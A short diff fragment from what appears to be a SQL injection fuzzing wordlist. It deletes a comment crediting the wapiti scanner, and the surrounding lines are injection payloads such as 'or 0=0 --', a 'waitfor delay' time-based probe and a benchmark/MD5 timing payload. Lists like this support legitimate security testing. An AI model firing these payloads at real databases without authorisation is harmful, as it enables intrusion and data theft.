@@ -25,7 +25,6 @@ asc
 (||6)
 "a"" or 3=3--"
 " or benchmark(10000000,MD5(1))#
-# from wapiti
  or 0=0 --
 1 waitfor delay '0:0:10'--
  or 'a'='a
